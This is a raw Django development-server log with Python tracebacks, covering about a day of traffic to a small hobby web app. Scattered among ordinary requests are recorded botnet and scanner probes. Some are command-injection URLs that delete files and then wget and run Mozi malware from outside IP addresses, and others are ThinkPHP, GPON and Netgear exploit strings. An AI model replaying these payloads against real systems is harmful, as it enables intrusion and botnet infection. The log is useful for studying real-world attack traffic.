[14/Oct/2020 13:44:46] "GET / HTTP/1.1" 200 643
[14/Oct/2020 13:44:47] "GET /favicon.ico HTTP/1.1" 404 179
[14/Oct/2020 13:44:48] "GET /welcome/ HTTP/1.1" 200 883
[14/Oct/2020 13:44:49] "GET /static/images/Samurai%20Champloo%20ED%2004.jpg HTTP/1.1" 200 202660
[14/Oct/2020 13:45:21] "GET /PonyApp/pony/ HTTP/1.1" 200 2482
[14/Oct/2020 13:45:21] "GET /favicon.ico HTTP/1.1" 404 179
[14/Oct/2020 13:45:23] "GET /SchoolApp/student/ HTTP/1.1" 200 2492
[14/Oct/2020 13:45:25] "GET /favicon.ico HTTP/1.1" 404 179
[14/Oct/2020 13:45:27] "GET /home2/ HTTP/1.1" 200 456
[14/Oct/2020 13:45:28] "GET / HTTP/1.1" 200 643
[14/Oct/2020 13:45:29] "GET /welcome/ HTTP/1.1" 200 883
[14/Oct/2020 13:45:31] "GET /favicon.ico HTTP/1.1" 404 179
[14/Oct/2020 13:46:06] "GET / HTTP/1.1" 200 643
[14/Oct/2020 13:46:10] "GET /welcome/ HTTP/1.1" 200 883
[14/Oct/2020 13:46:14] "GET /static/images/Samurai%20Champloo%20ED%2004.jpg HTTP/1.1" 200 202660
[14/Oct/2020 13:46:23] "GET /PonyApp/pony/ HTTP/1.1" 200 2482
[14/Oct/2020 13:46:34] "POST /PonyApp/pony_search/ HTTP/1.1" 200 2578
[14/Oct/2020 13:46:44] "POST /PonyApp/pony_search/ HTTP/1.1" 200 2852
[14/Oct/2020 13:46:53] "GET /SchoolApp/student/ HTTP/1.1" 200 2492
[14/Oct/2020 13:47:01] "POST /SchoolApp/student_search/ HTTP/1.1" 200 3087
[14/Oct/2020 14:18:02] "GET http://150.158.7.54/b.php HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('182.254.52.17', 53242)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[14/Oct/2020 14:19:03] "GET http://150.158.7.54/admin/mysql2/index.php HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('183.192.179.16', 43018)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[14/Oct/2020 14:25:25] "GET http://150.158.7.54/huoshan.php HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('58.247.212.239', 63456)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[14/Oct/2020 14:27:36] "GET /welcome/ HTTP/1.1" 200 883
[14/Oct/2020 14:27:41] "GET /static/images/Samurai%20Champloo%20ED%2004.jpg HTTP/1.1" 304 0
[14/Oct/2020 14:28:02] "GET /favicon.ico HTTP/1.1" 404 179
[14/Oct/2020 16:48:55] "GET /welcome/ HTTP/1.1" 200 883
[14/Oct/2020 16:48:55] "GET /static/images/Samurai%20Champloo%20ED%2004.jpg HTTP/1.1" 200 202660
[14/Oct/2020 16:48:55] "GET /favicon.ico HTTP/1.1" 404 179
[14/Oct/2020 17:05:14] "GET / HTTP/1.1" 200 643
[14/Oct/2020 17:22:39] "GET / HTTP/1.1" 200 643
[14/Oct/2020 17:47:18] "GET / HTTP/1.0" 200 643
[14/Oct/2020 17:57:19] "POST /HNAP1/ HTTP/1.0" 404 179
[14/Oct/2020 20:14:10] "GET / HTTP/1.0" 200 643
[14/Oct/2020 20:16:08] "GET / HTTP/1.1" 200 643
[14/Oct/2020 21:45:25] "GET /portal/redlion HTTP/1.1" 404 179
[14/Oct/2020 22:47:00] "GET /TP/public/index.php HTTP/1.1" 404 179
[14/Oct/2020 22:47:00] "GET /TP/index.php HTTP/1.1" 404 179
[14/Oct/2020 22:47:00] "GET /thinkphp/html/public/index.php HTTP/1.1" 404 179
[14/Oct/2020 22:47:00] "GET /html/public/index.php HTTP/1.1" 404 179
[14/Oct/2020 22:47:00] "GET /public/index.php HTTP/1.1" 404 179
[14/Oct/2020 22:47:00] "GET /TP/html/public/index.php HTTP/1.1" 404 179
[14/Oct/2020 22:47:00] "GET /elrekt.php HTTP/1.1" 404 179
[14/Oct/2020 22:47:00] "GET /index.php HTTP/1.1" 404 179
[14/Oct/2020 22:47:00] "GET / HTTP/1.1" 200 643
[14/Oct/2020 23:45:00] "GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 404 179
[14/Oct/2020 23:45:25] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 179
[15/Oct/2020 00:02:08] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 643
[15/Oct/2020 00:21:48] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 643
[15/Oct/2020 00:26:23] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://119.166.166.29:40793/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 200 40
[15/Oct/2020 00:30:03] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 179
[15/Oct/2020 00:30:05] code 400, message Bad request syntax ('/tmp/gpon80&ipv=0')
[15/Oct/2020 00:30:05] "/tmp/gpon80&ipv=0" 400 -
[15/Oct/2020 00:33:07] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 404 179
[15/Oct/2020 01:07:50] "GET / HTTP/1.1" 200 643
[15/Oct/2020 02:31:57] "GET / HTTP/1.1" 200 643
[15/Oct/2020 03:57:13] "HEAD /robots.txt HTTP/1.0" 404 179
[15/Oct/2020 04:03:22] "GET / HTTP/1.0" 200 643
[15/Oct/2020 04:06:39] "GET / HTTP/1.1" 200 643
[15/Oct/2020 04:06:39] "GET /robots.txt HTTP/1.1" 404 179
[15/Oct/2020 04:06:40] "GET /sitemap.xml HTTP/1.1" 404 179
[15/Oct/2020 04:06:41] "GET /.well-known/security.txt HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('94.102.49.193', 56920)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[15/Oct/2020 04:06:41] "GET /favicon.ico HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('94.102.49.193', 56324)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
----------------------------------------
Exception happened during processing of request from ('94.102.49.193', 55742)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[15/Oct/2020 04:06:57] "GET http://example.com/ HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('185.39.11.105', 38870)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[15/Oct/2020 05:23:42] "GET / HTTP/1.0" 200 643
[15/Oct/2020 05:28:33] "GET / HTTP/1.1" 200 643
[15/Oct/2020 05:29:11] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://123.14.55.86:59750/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 179
----------------------------------------
Exception happened during processing of request from ('45.148.121.85', 54801)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[15/Oct/2020 06:04:48] "HEAD /robots.txt HTTP/1.0" 404 179
[15/Oct/2020 06:51:22] "GET / HTTP/1.1" 200 643
[15/Oct/2020 07:26:51] "GET / HTTP/1.1" 200 643
----------------------------------------
Exception happened during processing of request from ('167.248.133.36', 40760)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[15/Oct/2020 07:41:34] "GET / HTTP/1.1" 200 643
----------------------------------------
Exception happened during processing of request from ('167.248.133.36', 58838)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[15/Oct/2020 07:41:34] "GET / HTTP/1.1" 200 643
[15/Oct/2020 08:13:31] "GET / HTTP/1.0" 200 643
[15/Oct/2020 08:18:27] "GET / HTTP/1.1" 200 643
[15/Oct/2020 12:08:07] "GET / HTTP/1.1" 200 643
[15/Oct/2020 12:08:08] "GET /favicon.ico HTTP/1.1" 404 179
[15/Oct/2020 12:08:10] "GET / HTTP/1.1" 200 643
[15/Oct/2020 12:34:12] "GET /api/4 HTTP/1.1" 404 179
[15/Oct/2020 13:17:51] "GET http://150.158.7.54/SchoolApp/student/ HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('182.254.52.17', 60777)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[15/Oct/2020 13:29:15] "GET http://150.158.7.54/welcome/ HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('182.254.52.17', 53194)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[15/Oct/2020 14:00:53] "GET / HTTP/1.1" 200 643
[15/Oct/2020 14:27:58] "GET / HTTP/1.1" 200 643
[15/Oct/2020 14:28:27] "GET http://150.158.7.54/welcome/ HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('101.89.19.140', 49888)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[15/Oct/2020 14:32:26] "GET / HTTP/1.1" 200 643
[15/Oct/2020 14:49:45] "GET http://150.158.7.54/PonyApp/pony/ HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('182.254.52.17', 39318)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[15/Oct/2020 14:51:39] "GET http://150.158.7.54/ HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('101.89.19.140', 51656)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[15/Oct/2020 16:06:33] "GET / HTTP/1.1" 200 643
[15/Oct/2020 16:55:46] "GET / HTTP/1.0" 200 643
[15/Oct/2020 17:51:01] "GET / HTTP/1.1" 200 643
[15/Oct/2020 18:25:31] "GET http://150.158.7.54/PonyApp/pony/ HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('182.254.52.17', 44128)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[15/Oct/2020 18:25:58] "GET http://example.com/ HTTP/1.1" 404 179
Traceback (most recent call last):
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 138, in run
    self.finish_response()
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 274, in write
    self.send_headers()
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 332, in send_headers
    self.send_preamble()
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 252, in send_preamble
    self._write(('HTTP/%s %s\r\n' % (self.http_version,self.status)).encode('iso-8859-1'))
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 453, in _write
    result = self.stdout.write(data)
  File "/usr/lib64/python3.6/socketserver.py", line 803, in write
    self._sock.sendall(b)
ConnectionResetError: [Errno 104] Connection reset by peer
[15/Oct/2020 18:25:58] "GET http://example.com/ HTTP/1.1" 500 59
----------------------------------------
Exception happened during processing of request from ('185.39.11.105', 56942)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 138, in run
    self.finish_response()
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 274, in write
    self.send_headers()
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 332, in send_headers
    self.send_preamble()
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 252, in send_preamble
    self._write(('HTTP/%s %s\r\n' % (self.http_version,self.status)).encode('iso-8859-1'))
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 453, in _write
    result = self.stdout.write(data)
  File "/usr/lib64/python3.6/socketserver.py", line 803, in write
    self._sock.sendall(b)
ConnectionResetError: [Errno 104] Connection reset by peer

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 141, in run
    self.handle_error()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 119, in handle_error
    super().handle_error()
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 368, in handle_error
    self.finish_response()
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 274, in write
    self.send_headers()
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 331, in send_headers
    if not self.origin_server or self.client_is_modern():
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 344, in client_is_modern
    return self.environ['SERVER_PROTOCOL'].upper() != 'HTTP/0.9'
TypeError: 'NoneType' object is not subscriptable

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 197, in handle_one_request
    handler.run(self.server.get_app())
  File "/usr/lib64/python3.6/wsgiref/handlers.py", line 144, in run
    self.close()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 114, in close
    super().close()
  File "/usr/lib64/python3.6/wsgiref/simple_server.py", line 35, in close
    self.status.split(' ',1)[0], self.bytes_sent
AttributeError: 'NoneType' object has no attribute 'split'
----------------------------------------
[15/Oct/2020 18:25:58] "CONNECT dnspod.qcloud.com:443 HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('45.148.121.28', 54763)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[15/Oct/2020 18:58:42] "HEAD /robots.txt HTTP/1.0" 404 179
[15/Oct/2020 19:43:08] "GET / HTTP/1.1" 200 643
[15/Oct/2020 19:53:41] "GET http://150.158.7.54/ HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('58.247.212.239', 51635)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[15/Oct/2020 19:58:06] "GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 404 179
[15/Oct/2020 19:58:23] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 179
[15/Oct/2020 20:05:46] "GET / HTTP/1.0" 200 643
----------------------------------------
Exception happened during processing of request from ('120.79.251.131', 59786)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[15/Oct/2020 20:08:36] "GET /login HTTP/1.1" 404 179
[15/Oct/2020 20:11:48] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 643
[15/Oct/2020 20:15:38] "GET / HTTP/1.1" 200 643
[15/Oct/2020 20:26:38] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 643
[15/Oct/2020 20:27:52] "GET http://150.158.7.54/ HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('182.254.52.17', 51443)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[15/Oct/2020 20:34:48] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 404 179
[15/Oct/2020 20:59:07] "GET http://150.158.7.54/welcome/ HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('183.192.179.16', 61958)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
----------------------------------------
Exception happened during processing of request from ('74.120.14.36', 57764)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
